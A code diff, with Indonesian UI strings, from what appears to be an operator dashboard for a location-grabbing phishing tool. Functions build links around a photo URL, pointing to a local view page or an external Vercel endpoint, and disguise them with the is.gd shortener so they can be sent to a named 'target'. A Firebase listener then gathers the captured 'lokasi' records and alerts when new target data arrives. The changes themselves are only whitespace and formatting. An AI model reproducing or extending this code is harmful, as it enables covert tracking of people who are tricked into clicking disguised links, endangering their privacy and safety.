-  
   try {
     const t = document.getElementById('targetName').value.trim() || 'target';
     const koord = dashAmbilKoordinat();
-    
     let longUrl = linkBase() + '/view.html?foto=' + encodeURIComponent(fotoUrl) + '&u=' + encodeURIComponent(user);
     if (koord) {
       longUrl += '&lat=' + koord.lat + '&lng=' + koord.lng;
       if (koord.nama) longUrl += '&nama=' + encodeURIComponent(koord.nama);
       addLog('📍 Koordinat: ' + koord.lat + ', ' + koord.lng, 'ok');
-    } else {
-      addLog('⚠ Tanpa koordinat', 'warn');
-    }
-    
+    } else { addLog('⚠ Tanpa koordinat', 'warn'); }
     window.currentLink = longUrl; window.lastLongLink = longUrl;
     window.currentFotoUrl = fotoUrl;
-    
     if(labelEl) labelEl.innerText = '› memperpendek link...';
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
-    
     const result = await autoShorten(longUrl);
     if(result.ok){
       window.currentShortLink = result.short;
@@ -1013,7 +1060,6 @@ window.genShareLoc1 = async function(){
       addLog('⚠ Shortlink gagal', 'warn');
       if(window.clipAdd) clipAdd(longUrl, 'SHARE-LOC-1');
     }
-    
     const preview = document.createElement('img');
     preview.src = fotoUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--gold-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
@@ -1030,33 +1076,25 @@ window.genShareLoc2 = async function(){
   const fotoUrl = document.getElementById('inputFotoUrl').value.trim();
   if(!fotoUrl){ alert('Tempel URL foto dulu!'); return; }
   if(!/^https?:\/\//i.test(fotoUrl)){ alert('URL harus mulai https://'); return; }
-  
   const resBox = document.getElementById('PROResult');
   const urlBox = document.getElementById('PROUrl');
   const labelEl = document.getElementById('PROLabel');
   resBox.style.display = 'block';
   if(labelEl) labelEl.innerText = '› membuat link Share Loc 2...';
   urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Memproses...</div>';
-  
   try {
     const t = document.getElementById('targetName').value.trim() || 'target';
     const koord = dashAmbilKoordinat();
-    
     let longUrl = 'https://official-brown-iota.vercel.app/api/p?foto=' + encodeURIComponent(fotoUrl) + '&u=' + encodeURIComponent(user);
     if (koord) {
       longUrl += '&lat=' + koord.lat + '&lng=' + koord.lng;
       if (koord.nama) longUrl += '&nama=' + encodeURIComponent(koord.nama);
       addLog('📍 Koordinat (SL2): ' + koord.lat + ', ' + koord.lng, 'ok');
-    } else {
-      addLog('⚠ Tanpa koordinat', 'warn');
-    }
-    
+    } else { addLog('⚠ Tanpa koordinat', 'warn'); }
     window.currentLink = longUrl; window.lastLongLink = longUrl;
     window.currentFotoUrl = fotoUrl;
-    
     if(labelEl) labelEl.innerText = '› memperpendek link...';
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
-    
     const result = await autoShorten(longUrl);
     if(result.ok){
       window.currentShortLink = result.short;
@@ -1075,7 +1113,6 @@ window.genShareLoc2 = async function(){
       addLog('⚠ Shortlink gagal', 'warn');
       if(window.clipAdd) clipAdd(longUrl, 'SHARE-LOC-2');
     }
-    
     const preview = document.createElement('img');
     preview.src = fotoUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--cyan-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
@@ -1164,14 +1201,7 @@ window.exportJSON=()=>{if(!allData.length)return alert('No data');const blob=new
 
 onValue(ref(db,'lokasi/'+user),snap=>{
   const data=snap.val();
-  if(!data){
-    allData=[];window.allData=[];
-    document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';
-    document.getElementById('countShown').innerText='0';
-    document.getElementById('countTotal').innerText='0';
-    updateStats();updateMultiMap();
-    return;
-  }
+  if(!data){allData=[];window.allData=[];document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';document.getElementById('countShown').innerText='0';document.getElementById('countTotal').innerText='0';updateStats();updateMultiMap();return}
   allData=Object.entries(data).filter(([,d])=>d.target).sort((a,b)=>b[1].waktu-a[1].waktu);
   window.allData=allData;
   if(!firstLoad&&allData.length>lastCnt){linkDataSound();addLog('✔ DATA BARU!','warn');actLog('✔ Data target baru masuk','info')}
